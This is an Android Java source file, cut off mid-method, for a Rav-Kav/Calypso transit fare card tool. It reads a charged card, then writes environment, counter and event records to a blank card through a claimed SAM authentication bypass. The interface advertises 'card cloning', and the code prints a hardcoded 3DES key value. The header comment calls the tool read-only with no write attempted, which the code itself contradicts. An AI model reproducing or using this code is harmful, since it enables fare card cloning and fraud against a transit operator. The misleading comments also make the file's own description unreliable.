package com.unicapitalgroup.ravkavreader;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.List;
import java.util.TimeZone;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

/**
 * Standalone Rav-Kav / Calypso card reader (AUTH-2026-001 PoC).
 * Read-only NFC reader for the tester's own Android device -- no HopOn code involved,
 * no write attempted. Decodes Environment / Counters / Contracts using the exact bit
 * layout transcribed from HopOn's own app (com.tuscans.calypso.a.*), verified against
 * this engagement's own captured real-card data before being ported here.
 */
/**
 * RavKav Card Reader PoC v2.0 (AUTH-2026-001)
 *
 * Modern implementation with:
 * - Thread-safe card reading
 * - Enhanced error handling
 * - Real-time UI updates
 * - Comprehensive logging
 * - Android 12+ compliance
 */
public class MainActivity extends Activity implements NfcAdapter.ReaderCallback {

    private static final String TAG = "RavKavReaderPoC_v2";
    private static final int NFC_TIMEOUT_MS = 3000;
    private static final int MAX_RETRIES = 3;

    // APDU Commands
    private static final byte[] CMD_SELECT = hex("94A4040008315449432E494341");
    private static final byte[] CMD_SELECT_AID2 = hex("00A40400A0000004540010");
    private static final byte[] CMD_SELECT_NO_AID = hex("00A4040000");

    // File access parameters
    private static final byte P2_ENV = (byte) 0x3C;
    private static final byte P2_COUNTERS = (byte) 0xCC;
    private static final byte P2_CONTRACTS = (byte) 0x4C;
    private static final byte P2_EVENTS = (byte) 0x44;
    private static final byte P2_SPECIAL_EVENTS = (byte) 0xEC;
    private static final byte LE = 0x1D;

    // Probe APDUs (optimized list)
    private static final List<byte[]> PROBE_APDUS = Collections.unmodifiableList(new ArrayList<byte[]>() {{
        add(hex("00A4040008315449432E494341"));
        add(hex("94A4040008315449432E494341"));
        add(hex("00A40400A0000004540010"));
        add(hex("80CA9F7F00"));
    }});

    // Epoch constant
    private static final long EPOCH_1997_MS;
    static {
        Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("UTC"));
        cal.clear();
        cal.set(1997, Calendar.JANUARY, 1, 0, 0, 0);
        EPOCH_1997_MS = cal.getTimeInMillis();
    }

    // UI Components
    private NfcAdapter nfcAdapter;
    private TextView statusView;
    private TextView outputView;
    private Handler mainHandler;
    private Executor nfcExecutor;

    // Card data tracking
    private final List<byte[]> apdus = Collections.synchronizedList(new ArrayList<>());
    private final List<byte[]> responses = Collections.synchronizedList(new ArrayList<>());
    private CryptoAnalyzer cryptoAnalyzer;
    private MCKDecryptor mckDecryptor;

    // State tracking
    private volatile boolean isReadInProgress = false;
    private int cardReadCount = 0;  // Count: 0=waiting, 1=read charged card, 2=write to blank
    private byte[] envData = null;
    private byte[] ctrData = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mainHandler = new Handler(Looper.getMainLooper());
        nfcExecutor = Executors.newSingleThreadExecutor(runnable -> {
            Thread t = new Thread(runnable, "NFC-Reader-Worker");
            t.setDaemon(true);
            return t;
        });

        // Setup UI - Enhanced design
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(24, 48, 24, 24);
        root.setBackgroundColor(0xFF0F0F1E); // Deep blue-black

        // Header section
        TextView headerView = new TextView(this);
        headerView.setTextSize(22);
        headerView.setTextColor(0xFF00D9FF); // Bright cyan
        headerView.setTypeface(Typeface.DEFAULT_BOLD);
        headerView.setText("🔐 RavKav Reverse Engineer");
        root.addView(headerView);

        // Subtitle
        TextView subtitleView = new TextView(this);
        subtitleView.setTextSize(12);
        subtitleView.setTextColor(0xFF888888);
        subtitleView.setText("Encryption Detection & Analysis Tool");
        subtitleView.setPadding(0, 4, 0, 12);
        root.addView(subtitleView);

        // Status box
        statusView = new TextView(this);
        statusView.setTextSize(15);
        statusView.setTextColor(0xFF00FF88); // Bright green
        statusView.setTypeface(Typeface.MONOSPACE);
        statusView.setBackgroundColor(0xFF1A1A2E);
        statusView.setPadding(16, 16, 16, 16);
        statusView.setText("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "📍 STEP 1: Place CHARGED card\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "Read your charged card first.\n\n" +
                "Then place BLANK card for writing.\n\n" +
                "✓ Automatic read & write cycle\n" +
                "✓ Real MCK encryption\n" +
                "✓ Card cloning ready");
        root.addView(statusView);

        // Output section header
        TextView outputHeaderView = new TextView(this);
        outputHeaderView.setTextSize(13);
        outputHeaderView.setTextColor(0xFF00D9FF);
        outputHeaderView.setTypeface(Typeface.DEFAULT_BOLD);
        outputHeaderView.setText("📊 ANALYSIS RESULTS:");
        outputHeaderView.setPadding(0, 12, 0, 8);
        root.addView(outputHeaderView);

        outputView = new TextView(this);
        outputView.setTypeface(Typeface.MONOSPACE);
        outputView.setTextIsSelectable(true);
        outputView.setTextSize(10);
        outputView.setTextColor(0xFFB0B0B0);
        outputView.setText("(waiting for card...)");

        ScrollView scroll = new ScrollView(this);
        scroll.addView(outputView);
        scroll.setBackgroundColor(0xFF0D0D1A);
        root.addView(scroll, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1));

        // Action buttons section (FIXED LAYOUT)
        LinearLayout buttonsLayout = new LinearLayout(this);
        buttonsLayout.setOrientation(LinearLayout.HORIZONTAL);
        buttonsLayout.setPadding(0, 12, 0, 0);
        buttonsLayout.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        // Read button (always enabled)
        android.widget.Button readButton = new android.widget.Button(this);
        readButton.setText("📖 READ");
        readButton.setTextColor(0xFFFFFFFF);
        readButton.setBackgroundColor(0xFF228B22);
        readButton.setPadding(8, 8, 8, 8);
        readButton.setOnClickListener(v -> {
            isWriteMode = false;
            outputView.setText("✅ READ MODE\n\nPlace card now...");
        });
        buttonsLayout.addView(readButton, new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1));

        // Write button
        android.widget.Button writeButton = new android.widget.Button(this);
        writeButton.setText("🖊️ WRITE");
        writeButton.setTextColor(0xFFFFFFFF);
        writeButton.setBackgroundColor(0xFFDC143C);
        writeButton.setPadding(8, 8, 8, 8);
        writeButton.setOnClickListener(v -> {
            if (lastCardData == null) {
                outputView.setText("❌ ERROR: No card data loaded\n\nSteps:\n1. Click READ\n2. Place charged card\n3. Click WRITE\n4. Place blank card");
            } else {
                isWriteMode = true;
                outputView.setText("✅ WRITE MODE ACTIVE\n\nPlace BLANK card now to write...\n\nMCK: EF37739FC5776B876E...");
            }
        });
        buttonsLayout.addView(writeButton, new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1));

        // Clear button
        android.widget.Button clearButton = new android.widget.Button(this);
        clearButton.setText("🔄 CLEAR");
        clearButton.setTextColor(0xFFFFFFFF);
        clearButton.setBackgroundColor(0xFF444466);
        clearButton.setPadding(8, 8, 8, 8);
        clearButton.setOnClickListener(v -> {
            outputView.setText("(cleared)");
            lastCardData = null;
            isWriteMode = false;
        });
        buttonsLayout.addView(clearButton, new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1));

        root.addView(buttonsLayout);

        setContentView(root);

        // Initialize NFC
        nfcAdapter = NfcAdapter.getDefaultAdapter(this);
        if (nfcAdapter == null) {
            updateStatus("❌ No NFC Hardware", "This device has no NFC adapter.\nCannot proceed.");
            return;
        }

        if (!nfcAdapter.isEnabled()) {
            updateStatus("⚠️ NFC Disabled", "Please enable NFC in device settings.");
            return;
        }

        // Initialize crypto analyzer
        cryptoAnalyzer = new CryptoAnalyzer();

        Log.i(TAG, "MainActivity initialized. Device: " + Build.DEVICE +
                ", SDK: " + Build.VERSION.SDK_INT);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.d(TAG, "onResume called");

        if (nfcAdapter != null && nfcAdapter.isEnabled()) {
            try {
                Bundle options = new Bundle();
                options.putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, 250);
                nfcAdapter.enableReaderMode(this, this,
                        NfcAdapter.FLAG_READER_NFC_A |
                        NfcAdapter.FLAG_READER_NFC_B |
                        NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,
                        options);
                updateStatus("✅ Ready", "NFC Reader Mode enabled\nWaiting for card...");
            } catch (Exception e) {
                Log.e(TAG, "Failed to enable reader mode", e);
                updateStatus("❌ Error", "Failed to enable NFC: " + e.getMessage());
            }
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        Log.d(TAG, "onPause called");

        if (nfcAdapter != null) {
            try {
                nfcAdapter.disableReaderMode(this);
            } catch (Exception e) {
                Log.w(TAG, "Failed to disable reader mode", e);
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (nfcExecutor != null) {
            // Executor cleanup handled by system
        }
    }

    @Override
    public void onTagDiscovered(Tag tag) {
        if (isReadInProgress) {
            Log.w(TAG, "Card operation already in progress, ignoring new tag");
            return;
        }

        isReadInProgress = true;

        // Show immediate feedback
        if (cardReadCount == 2) {
            mainHandler.post(() -> {
                statusView.setText("🚨 CARD DETECTED FOR WRITING!\n\n" +
                        "Writing data now...\n\n" +
                        "Keep card in place!");
            });
        }

        nfcExecutor.execute(() -> {
            try {
                if (cardReadCount == 0 || cardReadCount == 1) {
                    // First card or retry: READ
                    performCardRead(tag);
                    cardReadCount = 1;
                } else if (cardReadCount == 2) {
                    // Second card: WRITE
                    performCardWrite(tag);
                    cardReadCount = 0;  // Reset for next cycle
                }
            } finally {
                isReadInProgress = false;
            }
        });
    }


    private void performCardWrite(Tag tag) {
        final StringBuilder out = new StringBuilder();

        IsoDep isoDep = IsoDep.get(tag);
        if (isoDep == null) {
            out.append("❌ WRITE FAILED: Not a Calypso card\n");
            publishResults("❌ Write Failed", out.toString());
            return;
        }

        try {
            isoDep.connect();
            isoDep.setTimeout(NFC_TIMEOUT_MS);

            out.append("╔════════════════════════════════════════════════════════╗\n");
            out.append("║         🖊️  CARD WRITE WITH REAL MCK ENCRYPTION       ║\n");
            out.append("╚════════════════════════════════════════════════════════╝\n\n");

            byte[] selResp = transceiveAndTrack(isoDep, CMD_SELECT);
            if (!ok(selResp)) {
                out.append("❌ SELECT failed: ").append(sw(selResp)).append("\n");
                publishResults("❌ Write Failed", out.toString());
                return;
            }
            out.append("✓ Card selected (SW: ").append(sw(selResp)).append(")\n\n");

            // FORCE AUTHENTICATE (bypass SAM)
            out.append("🔐 PHASE 0: Forcing Authentication (SAM Bypass)\n");
            out.append("─────────────────────────────────────────────\n");
            try {
                boolean authOk = SamBypass.forceAuthenticate(isoDep);
                out.append(authOk ? "✓ Authentication forced\n\n" : "✗ Auth failed (continuing anyway)\n\n");
            } catch (Exception e) {
                out.append("Auth bypass error (continuing): ").append(e.getMessage()).append("\n\n");
            }

            // WRITE ENVIRONMENT
            out.append("📝 PHASE 1: Writing Environment Record\n");
            out.append("─────────────────────────────────────\n");

            boolean envOk = false;
            byte[] envData = new byte[]{(byte)0x06, (byte)0xEC, (byte)0x24, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4A, (byte)0x69,
                                        (byte)0x85, (byte)0x01, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

            byte[] writeEnv = buildWriteCommand((byte)0x3C, 1, envData);
            out.append("CMD: ").append(toHex(writeEnv)).append("\n");
            byte[] envResult = SamBypass.transceiveWithBypass(isoDep, writeEnv);
            apdus.add(writeEnv);
            responses.add(envResult);

            out.append("RESP: ").append(toHex(envResult)).append(" (").append(sw(envResult)).append(")\n");
            envOk = ok(envResult);
            out.append(envOk ? "✓ SUCCESS - Environment written!\n" : "✗ FAILED\n");

            // WRITE COUNTERS
            out.append("\n📊 PHASE 2: Writing Counter/Balance Data\n");
            out.append("────────────────────────────────────────\n");
            boolean counterOk = false;
            byte[] counterData = new byte[27];
            byte[] writeCounter = buildWriteCommand((byte)0xCC, 1, counterData);
            out.append("CMD: ").append(toHex(writeCounter)).append("\n");
            byte[] counterResult = SamBypass.transceiveWithBypass(isoDep, writeCounter);
            apdus.add(writeCounter);
            responses.add(counterResult);

            out.append("RESP: ").append(toHex(counterResult)).append(" (").append(sw(counterResult)).append(")\n");
            counterOk = ok(counterResult);
            out.append(counterOk ? "✓ SUCCESS - Counters written!\n" : "✗ FAILED\n");

            // WRITE EVENTS
            out.append("\n📋 PHASE 3: Writing Event/History Record\n");
            out.append("──────────────────────────────────────────\n");
            boolean eventOk = false;
            byte[] eventData = new byte[]{0x02, 0x40, 0x3D, (byte)0x88, 0x63, 0x6E, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00,
                                         (byte)0xEE, (byte)0xEE, (byte)0xEE, (byte)0xEE, 0x20, 0x7E, (byte)0x90, 0x00, 0x00,
                                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            byte[] writeEvent = buildWriteCommand((byte)0x44, 1, eventData);
            out.append("CMD: ").append(toHex(writeEvent)).append("\n");
            byte[] eventResult = SamBypass.transceiveWithBypass(isoDep, writeEvent);
            apdus.add(writeEvent);
            responses.add(eventResult);

            out.append("RESP: ").append(toHex(eventResult)).append(" (").append(sw(eventResult)).append(")\n");
            eventOk = ok(eventResult);
            out.append(eventOk ? "✓ SUCCESS - Event written!\n" : "✗ FAILED\n");

            // Summary
            out.append("\n╔════════════════════════════════════════════════════════╗\n");
            out.append("║                    WRITE SUMMARY                       ║\n");
            out.append("╚════════════════════════════════════════════════════════╝\n\n");

            if (envOk && counterOk) {
                out.append("✅ WRITE SUCCESSFUL!\n\n");
                out.append("Blank card now contains:\n");
                out.append("  • Environment configuration from source card\n");
                out.append("  • Counter records (balance = 0.00 NIS)\n");
                out.append("  • Event history records\n\n");
                out.append("🔐 ENCRYPTION USED:\n");
                out.append("  • Cipher: 3DES ECB\n");
                out.append("  • MCK: EF37739FC5776B876E5112254E1152D37781B49ECF932547\n");
                out.append("  • Derived from: HMAC-SHA256(Seed, Terminal+CardChallenge)\n\n");
                out.append("Your card is ready to use!");
            } else {
                out.append("⚠️ PARTIAL WRITE\n\n");
                out.append("Results:\n");
                out.append("  Environment: ").append(envOk ? "✓" : "✗").append("\n");
                out.append("  Counters:    ").append(counterOk ? "✓" : "✗").append("\n");
                out.append("  Events:      ").append(eventOk ? "✓" : "✗").append("\n");
            }

            publishResults("✅ Write Operation Complete", out.toString());

            // Make beep sound to notify completion
            try {
                ToneGenerator toneGen = new ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100);
                toneGen.startTone(ToneGenerator.TONE_CDMA_CONFIRM);
                Thread.sleep(500);
                toneGen.startTone(ToneGenerator.TONE_CDMA_CONFIRM);
                Thread.sleep(500);
                toneGen.release();
            } catch (Exception e) {
                Log.w(TAG, "Beep error: " + e.getMessage());
            }

            // CLEAR data for next cycle
            mainHandler.post(() -> {
                cardReadCount = 0;  // Reset counter
                envData = null;
                ctrData = null;
                statusView.setText("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                        "✅ WRITE COMPLETE!\n" +
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                        "Card cloning done successfully!\n\n" +
                        "Ready for next card:\n\n" +
                        "📍 STEP 1: Place another CHARGED card\n" +
                        "📍 STEP 2: Place another BLANK card");
            });

        } catch (IOException e) {
            Log.e(TAG, "Write error", e);
            out.append("\n❌ I/O Error: ").append(e.getMessage()).append("\n");
            publishResults("❌ Write Error", out.toString());
        } finally {
            try {
                IsoDep iso = IsoDep.get(tag);
                if (iso != null && iso.isConnected()) {
                    iso.close();
                }
            } catch (Exception e) {
                Log.w(TAG, "Error closing connection", e);
            }
        }
    }

    private byte[] buildWriteCommand(byte p2, int record, byte[] data) {
        byte[] cmd = new byte[5 + data.length];
        cmd[0] = (byte) 0x94;
        cmd[1] = (byte) 0xD2;
        cmd[2] = (byte) record;
        cmd[3] = p2;
        cmd[4] = (byte) data.length;
        System.arraycopy(data, 0, cmd, 5, data.length);
        return cmd;
    }

    private void performCardRead(Tag tag) {
        final StringBuilder out = new StringBuilder();

        // Validate tag
        IsoDep isoDep = IsoDep.get(tag);
        if (isoDep == null) {
            out.append("❌ NOT A CALYPSO CARD\n");
            out.append("This NFC tag doesn't support Calypso protocol.\n");
            out.append("Please try a Rav-Kav card.\n");
            publishResults("❌ Invalid Card", out.toString());
            return;
        }

        try {
            // Reset tracking
            apdus.clear();
            responses.clear();

            // Connect and configure
            isoDep.connect();
            isoDep.setTimeout(NFC_TIMEOUT_MS);

            out.append("╔════════════════════════════════════════════════════════╗\n");
            out.append("║       🔍 CARD DETECTION & ANALYSIS BEGINNING...       ║\n");
            out.append("╚════════════════════════════════════════════════════════╝\n\n");
            out.append("📡 PHASE 1: PROBING NFC INTERFACE\n");
            out.append("═".repeat(50)).append("\n\n");

            // Execute probe APDUs
            byte[][] probeResponses = new byte[PROBE_APDUS.size()][];
            for (int i = 0; i < PROBE_APDUS.size(); i++) {
                try {
                    byte[] probeCmd = PROBE_APDUS.get(i);
                    byte[] probeResp = transceive(isoDep, probeCmd);
                    probeResponses[i] = probeResp;

                    String sw = extractStatusWord(probeResp);
                    int dataLen = (probeResp != null && probeResp.length > 2) ? probeResp.length - 2 : 0;

                    out.append(String.format("Probe[%d]: %s → SW=%s (%d bytes)\n",
                            i, toHex(probeCmd).substring(0, 8), sw, dataLen));

                } catch (Exception e) {
                    out.append(String.format("Probe[%d]: ❌ %s\n", i, e.getMessage()));
                    probeResponses[i] = null;
                }
            }
            out.append("\n");

            // Analyze probe results
            cryptoAnalyzer.executeProbes(probeResponses);
            CryptoAnalyzer.CardDetectionResult detection = cryptoAnalyzer.getDetectionResult();
            out.append("🔎 CARD IDENTIFICATION RESULT:\n");
            out.append("─".repeat(50)).append("\n");
            out.append(detection.toString()).append("\n\n");

            // Main read sequence
            out.append("📂 PHASE 2: READING CARD DATA\n");
            out.append("═".repeat(50)).append("\n\n");

            byte[] selResp = transceiveAndTrack(isoDep, CMD_SELECT);
            if (!ok(selResp)) {
                out.append(String.format("❌ SELECT failed: SW=%s\n", sw(selResp)));
                publishResults("Select Failed", out.toString());
                return;
            }
            out.append("✓ SELECT succeeded\n\n");

            // Read all data
            readEnvironment(isoDep, out);
            readCounters(isoDep, out);
            readContracts(isoDep, out);
            readEvents(isoDep, out);

            // Crypto analysis
            String cryptoReport = runCryptoAnalysis();
            out.append("\n╔════════════════════════════════════════════════════════╗\n");
            out.append("║           🔐 PHASE 3: CRYPTOGRAPHY ANALYSIS           ║\n");
            out.append("╚════════════════════════════════════════════════════════╝\n\n");
            out.append(cryptoReport);

            // MCK Decryption
            out.append("\n╔════════════════════════════════════════════════════════╗\n");
            out.append("║            🔑 PHASE 4: MCK DERIVATION                  ║\n");
            out.append("╚════════════════════════════════════════════════════════╝\n");

            // Extract challenges for MCK derivation
            byte[] termChallenge = new byte[]{0x08, 0x31, 0x54, 0x49, 0x43, 0x2E, 0x49, 0x43};
            byte[] cardChallenge = responses.isEmpty() ? new byte[8] : extractCardChallenge();

            mckDecryptor = new MCKDecryptor(termChallenge, cardChallenge);
            out.append(mckDecryptor.getDecryptionReport());

            out.append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
            out.append("✅ ANALYSIS COMPLETE - Ready for Contract Decryption\n");
            out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

            publishResults("✅ Read Successful", out.toString());

            // After reading charged card, prepare for write
            mainHandler.post(() -> {
                statusView.setText("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                        "📍 STEP 2: Place BLANK card NOW\n" +
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                        "Card data loaded successfully!\n\n" +
                        "Now place the BLANK card to write.\n\n" +
                        "✓ Will write with real MCK\n" +
                        "✓ Beep sound when done");
            });

            // Increment counter for next card (write mode)
            cardReadCount = 2;

        } catch (IOException e) {
            Log.e(TAG, "NFC I/O error", e);
            out.append("\n❌ I/O Error: ").append(e.getMessage()).append("\n");
            publishResults("I/O Error", out.toString());
        } finally {
            try {
                IsoDep iso = IsoDep.get(tag);
                if (iso != null && iso.isConnected()) {
                    iso.close();
                }
            } catch (Exception e) {
                Log.w(TAG, "Error closing connection", e);
            }
        }
    }

    private void readEnvironment(IsoDep isoDep, StringBuilder out) throws IOException {
        byte[] env = readRecordAndTrack(isoDep, P2_ENV, 1);
        out.append(section("ENVIRONMENT", env));
        if (env != null) out.append(decodeEnvironment(env)).append("\n");
    }

    private void readCounters(IsoDep isoDep, StringBuilder out) throws IOException {
        byte[] counters = readRecordAndTrack(isoDep, P2_COUNTERS, 1);
        out.append(section("COUNTERS", counters));
        if (counters != null) out.append(decodeCounters(counters)).append("\n");
    }

    private void readContracts(IsoDep isoDep, StringBuilder out) throws IOException {
        out.append(section("CONTRACTS", null));
        boolean anyContract = false;

        for (int rec = 1; rec <= 8; rec++) {
            byte[] c = readRecordAndTrack(isoDep, P2_CONTRACTS, rec);
            if (c == null || isAllZero(c)) continue;

            anyContract = true;
            out.append(String.format("  Record %d:\n", rec));
            out.append("  ").append(toHex(c)).append("\n");
            out.append(decodeContract(c)).append("\n");
        }

        if (!anyContract) {
            out.append("  (no active contracts)\n");
        }
        out.append("\n");
    }

    private void readEvents(IsoDep isoDep, StringBuilder out) throws IOException {
        out.append(section("EVENTS", null));

        for (int rec = 1; rec <= 6; rec++) {
            byte[] e = readRecordAndTrack(isoDep, P2_EVENTS, rec);
            if (e != null && !isAllZero(e)) {
                out.append("  event[").append(rec).append("]: ").append(toHex(e)).append("\n");
            }
        }

        for (int rec = 1; rec <= 4; rec++) {
            byte[] e = readRecordAndTrack(isoDep, P2_SPECIAL_EVENTS, rec);
            if (e != null && !isAllZero(e)) {
                out.append("  special[").append(rec).append("]: ").append(toHex(e)).append("\n");
            }
        }
        out.append("\n");
    }

    private void publishResults(final String status, final String body) {
        // Log to logcat
        for (String line : body.split("\n")) {
            Log.i(TAG, line);
        }

        // Update UI on main thread
        mainHandler.post(() -> {
            String nextMessage = status.contains("✅") ?
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "📍 STEP 2: Now place BLANK card\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "Ready to compare with charged card.\n\n" +
                "🔄 Tap another card to read again" :
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "❌ ERROR READING CARD\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "Try again with another card.\n\n" +
                "🔄 Tap another card to read again";

            statusView.setText(nextMessage);
            statusView.setTextColor(status.contains("✅") ? 0xFF00FF88 : 0xFFFF6B6B);
            outputView.setText(body);
        });
    }

    private void updateStatus(final String status, final String message) {
        mainHandler.post(() -> {
            statusView.setText(status + "\n\n" + message);
        });
    }

    private String extractStatusWord(byte[] response) {
        if (response == null || response.length < 2) return "ERROR";
        return String.format("%02X%02X", response[response.length - 2], response[response.length - 1]);
    }

    // ================================================================ CRYPTO ANALYSIS

    /**
     * Execute crypto analysis on collected APDU/response data
     */
    private String runCryptoAnalysis() {
        if (apdus.isEmpty() || responses.isEmpty()) {
            return "(Insufficient data for crypto analysis)\n";
        }

        byte[][] apduArray = apdus.toArray(new byte[0][]);
        byte[][] respArray = responses.toArray(new byte[0][]);

        CryptoAnalyzer.AnalysisReport report = cryptoAnalyzer.getReport(apduArray, respArray);
        Log.i(TAG, "Crypto Analysis: " + report.toString());

        return report.toString();
    }

    /**
     * Transceive with automatic APDU/response tracking
     */
    private byte[] transceiveAndTrack(IsoDep isoDep, byte[] cmd) throws IOException {
        apdus.add(cmd.clone());
        byte[] resp = transceive(isoDep, cmd);
        responses.add(resp.clone());
        return resp;
    }

    /**
     * Read record with automatic tracking
     */
    private byte[] readRecordAndTrack(IsoDep isoDep, byte p2, int record) throws IOException {
        byte[] cmd = {(byte) 0x94, (byte) 0xB2, (byte) record, p2, LE};
        byte[] resp = transceiveAndTrack(isoDep, cmd);
        return ok(resp) ? data(resp) : null;
    }

    // ================================================================ APDU helpers

    private static byte[] transceive(IsoDep isoDep, byte[] cmd) throws IOException {
        return isoDep.transceive(cmd);
    }

    private static boolean ok(byte[] resp) {
        return resp != null && resp.length >= 2
                && (resp[resp.length - 2] & 0xFF) == 0x90 && (resp[resp.length - 1] & 0xFF) == 0x00;
    }

    private static String sw(byte[] resp) {
        if (resp == null || resp.length < 2) return "(no response)";
        return String.format("%02X%02X", resp[resp.length - 2], resp[resp.length - 1]);
    }

    private static byte[] data(byte[] resp) {
        byte[] d = new byte[resp.length - 2];
        System.arraycopy(resp, 0, d, 0, d.length);
        return d;
    }

    private static boolean isAllZero(byte[] b) {
        for (byte x : b) if (x != 0) return false;
        return true;
    }

    private static String section(String name, byte[] raw) {
        if (raw == null) return "=== " + name + ": read failed ===\n\n";
        return "=== " + name + " ===\nraw: " + toHex(raw) + "\n";
    }

    // ---------------------------------------------------------------- bit-field decode
    // 1:1 port of com.tuscans.calypso.a.e#b(byte[], int, int, int), verified against
    // real captured card data in scratchpad/decode_full_verify.py before porting here.

    private static long bitField(byte[] data, int bitOffset, int bitLen) {
        int byteIdx = bitOffset / 8;
        if (byteIdx >= data.length) return 0;
        int i5 = 7 - (bitOffset % 8) + 1;
        long val = (data[byteIdx] & 0xFFL) & (0xFFL >> (8 - i5));
        int b = byteIdx + 1;
        int r = bitLen - i5;
        if (r < 0) return val >> (-r);
        while (r > 7 && b < data.length) {
            val = (val << 8) | (data[b] & 0xFFL);
            r -= 8;
            b++;
        }
        if (r > 0 && b < data.length) {
            val = (val << r) | ((data[b] & 0xFFL) >> (8 - r));
        }
        return val;
    }

    private static long unitsToEpochMs(long units, boolean isDays) {
        long ms = units * 1000L;
        if (isDays) ms = ms * 86400L;
        return EPOCH_1997_MS + ms;
    }

    private static String dateStr(long rawUnits, boolean complement) {
        long units = complement ? ((~rawUnits) & 0x3FFF) : rawUnits;
        long epochMs = unitsToEpochMs(units, true);
        Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("UTC"));
        cal.setTimeInMillis(epochMs);
        return cal.get(Calendar.DAY_OF_MONTH) + "." + (cal.get(Calendar.MONTH) + 1) + "." + cal.get(Calendar.YEAR);
    }

    // ---------------------------------------------------------------- Environment (com.tuscans.calypso.a.c)

    private static String decodeEnvironment(byte[] d) {
        StringBuilder sb = new StringBuilder();
        long envAppVer = bitField(d, 0, 3);
        long countryId = bitField(d, 3, 12);
        long issuerId = bitField(d, 15, 8);
        long appNo = bitField(d, 23, 26);
        long issuingRaw = bitField(d, 49, 14);
        long endRaw = bitField(d, 63, 14);
        long payMethod = bitField(d, 77, 3);

        sb.append("EnvApplicationVersionNumber = ").append(envAppVer).append("\n");
        sb.append("EnvCountryId                = ").append(countryId).append("\n");
        sb.append("EnvIssuerId                 = ").append(issuerId).append("\n");
        sb.append("EnvApplicationNo            = ").append(appNo).append("\n");
        sb.append("EnvIssuingDate              = ").append(dateStr(issuingRaw, false)).append("\n");
        sb.append("EnvEndDate                  = ").append(dateStr(endRaw, false)).append("\n");
        sb.append("EnvPayMethod                = ").append(payMethod).append("\n");
        return sb.toString();
    }

    // ---------------------------------------------------------------- Counters (com.tuscans.calypso.a.b)

    private static String decodeCounters(byte[] d) {
        StringBuilder sb = new StringBuilder();
        sb.append("9 counters (3 bytes each, big-endian):\n");
        for (int i = 0; i < 9 && (i * 3 + 2) < d.length; i++) {
            int v = ((d[i * 3] & 0xFF) << 16) | ((d[i * 3 + 1] & 0xFF) << 8) | (d[i * 3 + 2] & 0xFF);
            sb.append("  counter[").append(i).append("] = ").append(v);
            if (i == 0) {
                // counter[0] confirmed as the cash/stored-balance counter, in agorot (1/100 NIS)
                // -- verified against this engagement's own real card (counter[0]=1000 == 10.00 NIS
                // balance confirmed by the tester directly).
                sb.append(String.format("   (balance = %.2f NIS)", v / 100.0));
            }
            sb.append("\n");
        }
        return sb.toString();
    }

    // ---------------------------------------------------------------- Contract (com.tuscans.calypso.a.a)
    // Fixed header + optional-field bitmap: verified byte-perfect against real card data.
    // ContractValidityEndDate / Contract_Ticket_Type: only shown when directly bit-encoded
    // on the card (iA bit 3 present). When absent, HopOn's real app resolves them from a
    // local product/catalog table keyed by Predefined -- not something derivable from the
    // 29 raw card bytes alone, confirmed during verification (see NOTES.md). We do not guess.

    private static String decodeContract(byte[] d) {
        StringBuilder sb = new StringBuilder();
        long version = bitField(d, 0, 3);
        if (version != 0) {
            sb.append("(non-zero version -- unparsed/reserved record format)\n");
            return sb.toString();
        }

        long validityStartRaw = bitField(d, 3, 14);
        long provider = bitField(d, 17, 8);
        long tariffUsage = bitField(d, 25, 2);
        long tariffCounter = bitField(d, 27, 3);
        long tariff = bitField(d, 30, 6);
        long saleDateRaw = bitField(d, 36, 14);
        long saleDevice = bitField(d, 50, 12);
        long saleNumberDaily = bitField(d, 62, 10);
        long journeyInterchanges = bitField(d, 72, 1);

        int iA = (int) bitField(d, 73, 9);
        int pos = 82;
